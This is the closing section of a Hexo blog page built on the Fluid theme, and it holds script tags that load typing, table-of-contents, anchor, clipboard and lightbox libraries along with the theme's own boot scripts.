<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
